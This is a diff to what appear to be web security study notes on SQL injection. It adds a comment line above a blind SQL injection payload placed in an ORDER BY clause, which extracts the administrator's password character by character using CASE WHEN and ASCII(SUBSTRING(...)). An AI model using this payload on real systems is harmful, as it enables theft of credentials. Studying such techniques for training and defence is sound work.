@@ -2,6 +2,7 @@
 
 ```sql
 -- In order by statment https://portswigger.net/support/sql-injection-in-the-query-structure
+-- ASCII converts the characters to numbers
 (CASE+WHEN(SELECT+ASCII(SUBSTRING(password,1,1))+FROM+users+where+username+%3d+'administrator')%3d97+THEN+AUTHOR+ELSE+TITLE+END)
 
 -- Divides by 1 if true, 0 if not
